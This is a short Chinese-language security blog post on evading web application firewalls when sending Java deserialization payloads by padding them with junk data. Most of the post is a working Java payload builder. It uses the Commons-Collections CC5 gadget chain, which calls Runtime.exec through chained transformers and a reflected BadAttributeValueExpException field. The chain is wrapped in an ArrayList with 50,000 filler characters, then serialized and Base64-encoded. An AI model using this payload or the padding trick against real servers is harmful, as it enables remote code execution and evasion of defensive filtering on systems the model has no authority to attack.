# Java反序列化数据绕WAF之加大量脏数据

## 前言

在看P神Java漫谈19的时候看到了这个，所以也学习一下。

## 分析

需要的就是往反序列化数据中加入大量的脏数据了，c0ny1师傅想到的就是反序列化集合类，然后将Gadget对象和脏数据放入集合中。

简单的例子，对于CC5来说：

```java
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Class.forName("java.lang.Runtime")),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class,Class[].class},
                        new Object[]{"getRuntime",new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class,Object[].class},
                        new Object[]{null,new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"calc"}
                )
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, chainedTransformer);


        TiedMapEntry tiedMapEntry = new TiedMapEntry(outerMap,"feng");

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);

        //Reflection
        Class clazz = Class.forName("javax.management.BadAttributeValueExpException");
        Field field = clazz.getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException,tiedMapEntry);

        String dirtyData = "";
        for (int i = 0; i <50000;i++){
            dirtyData +="a";
        }
        List<Object> arrayList = new ArrayList<>();
        //System.out.println(dirtyData);
        arrayList.add(dirtyData);
        arrayList.add(badAttributeValueExpException);

        byte[] bytes = SerializeUtil.serialize(arrayList);
        System.out.println(Base64.getEncoder().encodeToString(bytes));
```

